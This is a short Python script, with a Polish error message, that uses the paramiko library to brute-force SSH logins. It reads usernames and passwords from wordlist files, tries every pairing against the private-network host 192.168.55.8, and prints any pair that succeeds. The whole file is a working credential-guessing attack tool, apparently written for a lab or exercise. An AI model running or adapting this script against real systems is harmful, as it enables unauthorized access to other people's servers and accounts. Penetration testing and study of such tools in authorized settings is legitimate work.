import paramiko
def logging_ssh(hostname, username, password):
    ssh_session = paramiko.SSHClient()
    ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_session.connect(hostname=hostname, username=username, password=password, timeout=3)
        print(username, password)
        return True
    except paramiko.ssh_exception.AuthenticationException as error:
        print("Nie poprawne haslo lub login")
        ssh_session.close()
        return False
hostname = "192.168.55.8"
usernames = []
passwords = []
with open("username.txt", encoding="UTF-8") as f:
    for line in f.readlines():
        usernames.append(line.strip().lower())
with open("pass.txt", encoding="UTF-8") as f:
    for line in f.readlines():
        passwords.append(line.strip().lower())
for username in usernames:
    for password in passwords:
        logging_ssh(hostname, username, password)
